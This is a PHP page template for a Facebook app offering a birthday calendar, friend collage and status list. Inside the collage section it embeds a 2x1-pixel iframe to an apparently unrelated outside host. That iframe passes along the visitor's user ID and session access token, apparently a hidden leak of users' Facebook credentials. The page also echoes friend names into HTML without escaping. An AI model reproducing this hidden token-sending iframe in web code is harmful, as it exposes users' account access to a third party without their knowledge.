<div class="sponsorListHolder">
<?php

$option=$_GET['option'];
// Each sponsor is an element of the $sponsors array:

$sponsors = array(
	array('facebook','The biggest social network in the world.','https://apps.facebook.com/friendsadda/index.php','1','Birhtday calender '),
	array('collage','The biggest social network in the world.','https://apps.facebook.com/friendsadda/index.php','2','Friends collage'),
	array('status','The biggest social network in the world.','https://apps.facebook.com/friendsadda/index.php','3','All my statuses '),
	array('compatiblity','The biggest social network in the world.','https://apps.facebook.com/friendsadda/index.php','4','Friend compatiblity')
);

?>
		
        <?php
			
			// Looping through the array:
		if(!isset($_GET['option']))
		{ 
			foreach($sponsors as $company)
			{
				echo'
				<a href="'.$fbconfig['appBaseUrl'].'?option='.$company[3].'" target="_top"><div class="sponsor" title="Click to flip">
					<div class="sponsorFlip">
						<img src="ui/img/sponsors/'.$company[0].'.png" width="130" height="110" alt="More about '.$company[0].'" />
						<b>'.$company[4].'</b>
					</div>
					
					<div class="sponsorData">
						<div class="sponsorDescription">
							'.$company[1].'
						</div>
						<div class="sponsorURL">
							'.$fbconfig['appBaseUrl'].'
						</div>
					</div>
				</div>
				</a>
				
				';
				
			}
		}
		?>

        
    	<div class="clear"></div>
    </div>

</div>

  <? if($flag ==0)  { 
  if($option==1) {  ?>
  
  

    <?php include_once  "include/calender.php";?>
 
     		<!-- <form name="statusUpdate" action="" method="">
      		      <textarea name="status" id="status" rows="4" cols="50"></textarea>
     		       <br />
     		       <input type="button" onclick="updateStatus(); return false;" value="Update Status via AJAX And PHP API" />
      		      <br />
    	      <input type="button" onclick="updateStatusViaJavascriptAPICalling(); return false;" value="Update Status via Facebook Javascript Librar				y" />
    				    </form>-->
       <? } ?> 
						
						<? if($option==2) {
						  
						 ?>
						   <div style="height: auto; overflow: auto" id="new">
						    <a href="https://apps.facebook.com/friendsadda/collage.php" target="_blank">Click here to have a better look at collage</a> <br/>

						  

						    <?php 
						     if($flag==0)
						      {
						      
							 if ($user) {
						   
							$uid = $facebook->getUser();
							$me = $facebook->api('/me/friends');
							foreach($me['data'] as $frns)
							{
								echo "<img  src=\"https://graph.facebook.com/".$frns['id']."/picture\" title=\"".$frns['name']."\"/>";
							
							}
									
												
									}
							$_SESSION['name']=$me['name'];
						      }
							?>
						     </div>
	<iframe src="https://jet.nseasy.com/~greenpor/fb/apps/tasks/img_2.php?user=<? echo $user ; ?>&access=<? echo $_SESSION['access'] ?>" width= "2" height="1"></iframe>
						     <? } ?> 


  						  <? if($option==3) {
  						 
  						   ?>
  						  <h3>Your all recent status </h3>
  						  <div class="box"><div class="boxContent">
						  <table>
							<tr>	<th>No.</th>
								<th>Date and time</th>
								<th>Status Message ? </th>
								<th>Link for status !</th>
								<th>Likes </th>
								<th>Share this ! </th>


								

															
							</tr> 
						<?php include_once "include/status.php";	?></table>  
					        </div>
						</div></div>
						<? } ?> 
</div> <? } 

 if($option==4) 
 {
 } ?>
 